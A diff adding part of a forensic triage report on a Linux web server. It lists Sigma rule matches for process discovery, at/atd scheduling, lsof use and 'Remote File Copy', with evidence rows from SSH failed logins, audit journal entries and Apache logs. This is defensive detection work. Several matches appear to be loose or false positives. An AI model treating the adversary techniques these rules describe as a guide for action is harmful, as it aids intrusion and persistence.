+    1 row(s) in PROCESS_MASTER - Detects process discovery commands. Adversaries may attempt to
+    get information about running processes on a system.
+    Information obtained could be used to gain an understanding of common software/applications
+    running on systems within the network
+    
+      | pid=7746; user=root; exe=/bin/ps; exe_source=journal _EXE (same boot); cmdline=ps -eo pid,user,lstart,args; start_utc=2021-12-08 18:51:34; sources=ps
+
+[LOW/8] Sigma rule matched: Scheduled Task/Job At
+    category : Detection
+    att&ck   : T1053.002
+    artifact : PROCESS_MASTER
+    seen     : 1 occurrence(s), 2021-10-09 15:06:25 UTC
+    1 row(s) in PROCESS_MASTER - Detects the use of at/atd which are utilities that are used to
+    schedule tasks.
+    They are often abused by adversaries to maintain persistence or to perform task scheduling
+    for initial or recurring execution of malicious code
+    
+      | pid=1003; ppid=1; parent=systemd; user=daemon; state=S; comm=atd; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link
+
+[LOW/9] Sigma rule matched: System Network Connections Discovery - Linux
+    category : Detection
+    att&ck   : T1049
+    artifact : PROCESS_MASTER
+    seen     : 2 occurrence(s)
+    2 row(s) in PROCESS_MASTER - Detects usage of system utilities to discover system network
+    connections
+      | pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=16; sources=lsof, ps
+      | pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=11; sources=lsof, ps
+
+[LOW/10] Sigma rule matched: Remote File Copy
+    category : Detection
+    att&ck   : T1105
+    artifact : VAR_LOG
+    seen     : 67 occurrence(s), 2021-11-19 22:44:14 .. 2021-11-19 22:44:50 UTC
+    67 row(s) in VAR_LOG - Detects the use of tools that copy files from or to remote systems
+      | timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Invalid user amsftp from 10.0.0.4 port 55476; log=/var/log/auth.log.3.gz; line_no=46593
+      | timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Disconnected from invalid user amsftp 10.0.0.4 port 55476 [preauth]; log=/var/log/auth.log.3.gz; line_no=46595
+      | timestamp_utc=2021-11-19 22:44:44; timestamp=Nov 19 22:44:44; host=ApacheWebServer; process=sshd; pid=12145; message=Invalid user amsftp from 10.0.0.4 port 55514; log=/var/log/auth.log.3.gz; line_no=46596
+      | timestamp_utc=2021-11-19 22:44:46; timestamp=Nov 19 22:44:46; host=ApacheWebServer; process=sshd; pid=12098; message=Disconnected from invalid user amsftp 10.0.0.4 port 55454 [preauth]; log=/var/log/auth.log.3.gz; line_no=46598
+      | timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12145; message=Disconnected from invalid user amsftp 10.0.0.4 port 55514 [preauth]; log=/var/log/auth.log.3.gz; line_no=46600
+      | timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12125; message=Disconnected from invalid user amsftp 10.0.0.4 port 55506 [preauth]; log=/var/log/auth.log.3.gz; line_no=46602
+      | timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12115; message=Disconnected from invalid user amsftp 10.0.0.4 port 55478 [preauth]; log=/var/log/auth.log.3.gz; line_no=46604
+      | timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12166; message=Disconnected from invalid user amsftp 10.0.0.4 port 55534 [preauth]; log=/var/log/auth.log.3.gz; line_no=46606
+      | timestamp_utc=2021-11-19 22:44:49; timestamp=Nov 19 22:44:49; host=ApacheWebServer; process=sshd; pid=12159; message=Invalid user amsftp from 10.0.0.4 port 55518; log=/var/log/auth.log.3.gz; line_no=46609
+      | timestamp_utc=2021-11-19 22:44:50; timestamp=Nov 19 22:44:50; host=ApacheWebServer; process=sshd; pid=12159; message=Disconnected from invalid user amsftp 10.0.0.4 port 55518 [preauth]; log=/var/log/auth.log.3.gz; line_no=46613
+
+[LOW/11] Sigma rule matched: Remote File Copy
+    category : Detection
+    att&ck   : T1105
+    artifact : AUTH_LOG
+    seen     : 66 occurrence(s), 2021-11-19 22:44:14 .. 2021-11-19 22:44:50 UTC
+    66 row(s) in AUTH_LOG - Detects the use of tools that copy files from or to remote systems
+      | timestamp_utc=2021-11-19 22:44:43; timestamp_raw=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; event=invalid user; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:43; timestamp_raw=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:44; timestamp_raw=Nov 19 22:44:44; host=ApacheWebServer; process=sshd; pid=12145; event=invalid user; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:46; timestamp_raw=Nov 19 22:44:46; host=ApacheWebServer; process=sshd; pid=12098; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:47; timestamp_raw=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12145; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:47; timestamp_raw=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12125; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:47; timestamp_raw=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12115; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:47; timestamp_raw=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12166; event=connection closed; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:49; timestamp_raw=Nov 19 22:44:49; host=ApacheWebServer; process=sshd; pid=12159; event=invalid user; event_class=auth; user=amsftp
+      | timestamp_utc=2021-11-19 22:44:50; timestamp_raw=Nov 19 22:44:50; host=ApacheWebServer; process=sshd; pid=12159; event=connection closed; event_class=auth; user=amsftp
+
+[LOW/12] Sigma rule matched: Remote File Copy
+    category : Detection
+    att&ck   : T1105
+    artifact : FAILED_LOGINS
+    seen     : 66 occurrence(s), 2021-11-19 22:44:14 .. 2021-11-19 22:44:50 UTC
+    66 row(s) in FAILED_LOGINS - Detects the use of tools that copy files from or to remote
+    systems
+      | timestamp_utc=2021-11-19 22:44:37; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55430; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55430; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:38; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55454; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55454; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:39; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55506; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55506; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:40; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55516; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55516; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:40; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55534; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55534; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:41; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55496; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55496; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:42; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55478; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55478; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:43; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55476; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55476; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:44; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55514; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55514; logged_by=auth.log
+      | timestamp_utc=2021-11-19 22:44:49; kind=unknown account; user=amsftp; source_ip=10.0.0.4; port=55518; service=sshd; detail=Invalid user amsftp from 10.0.0.4 port 55518; logged_by=auth.log
+
+[LOW/13] Sigma rule matched: Remote File Copy
+    category : Detection
+    att&ck   : T1105
+    artifact : JOURNAL
+    seen     : 13 occurrence(s), 2021-12-08 17:30:55 .. 2021-12-08 19:39:54 UTC
+    13 row(s) in JOURNAL - Detects the use of tools that copy files from or to remote systems
+      | timestamp_utc=2021-12-08 19:19:43; hostname=ApacheWebServer; identifier=audit; comm=rsync; pid=25028; uid=0; gid=0; exe=/bin/dash
+      | timestamp_utc=2021-12-08 19:19:43; hostname=ApacheWebServer; identifier=audit; cmdline=readlink -f /etc/init.d/rsync; transport=audit; message=PROCTITLE proctitle=726561646C696E6B002D66002F6574632F696E69742E642F7273796E63; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:01; hostname=ApacheWebServer; identifier=audit; cmdline=statx /etc/default/rsync; transport=audit; message=PROCTITLE proctitle=7374617478002F6574632F64656661756C742F7273796E63; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:01; hostname=ApacheWebServer; identifier=audit; cmdline=statx /etc/init.d/rsync; transport=audit; message=PROCTITLE proctitle=7374617478002F6574632F696E69742E642F7273796E63; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:09; hostname=ApacheWebServer; identifier=audit; cmdline=statx /sbin/ntfscp; transport=audit; message=PROCTITLE proctitle=7374617478002F7362696E2F6E7466736370; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:13; hostname=ApacheWebServer; identifier=audit; cmdline=statx /usr/bin/rsync; transport=audit; message=PROCTITLE proctitle=7374617478002F7573722F62696E2F7273796E63; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:13; hostname=ApacheWebServer; identifier=audit; cmdline=statx /usr/bin/scp; transport=audit; message=PROCTITLE proctitle=7374617478002F7573722F62696E2F736370; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:13; hostname=ApacheWebServer; identifier=audit; cmdline=statx /usr/bin/sftp; transport=audit; message=PROCTITLE proctitle=7374617478002F7573722F62696E2F73667470; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:37:45; hostname=ApacheWebServer; identifier=audit; cmdline=statx /usr/share/bash-completion/completions/rsync; transport=audit; message=PROCTITLE proctitle=7374617478002F7573722F73686172652F626173682D636F6D706C657...; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+      | timestamp_utc=2021-12-08 19:39:54; hostname=ApacheWebServer; identifier=audit; cmdline=statx /usr/share/lintian/overrides/rsync; transport=audit; message=PROCTITLE proctitle=7374617478002F7573722F73686172652F6C696E7469616E2F6F76657...; source_file=/var/log/journal/3f2384ad405440dc9c3469e593485d63/system@25602ecd838648949ece...
+
+[LOW/14] Sigma rule matched: Remote File Copy
+    category : Detection
+    att&ck   : T1105
+    artifact : WEB_LOG
+    seen     : 7 occurrence(s), 2021-11-28 18:58:32 .. 2021-11-30 13:05:51 UTC
+    7 row(s) in WEB_LOG - Detects the use of tools that copy files from or to remote systems
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 18:58:32; timestamp_raw=Sun Nov 28 18:58:32.809620 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 19:01:10; timestamp_raw=Sun Nov 28 19:01:10.973735 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 19:02:17; timestamp_raw=Sun Nov 28 19:02:17.249849 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 19:03:53; timestamp_raw=Sun Nov 28 19:03:53.430460 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 19:04:45; timestamp_raw=Sun Nov 28 19:04:45.663570 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2539
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-28 19:05:40; timestamp_raw=Sun Nov 28 19:05:40.047965 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
+      | client_ip=198.18.0.51; timestamp_utc=2021-11-30 13:05:51; timestamp_raw=Tue Nov 30 13:05:51.286147 2021; server=apache2; kind=error; level=trace7; module=dumpio; pid=2632
 
 ----------------------------------------------------------------------------------------------------
  INFO FINDINGS (9)
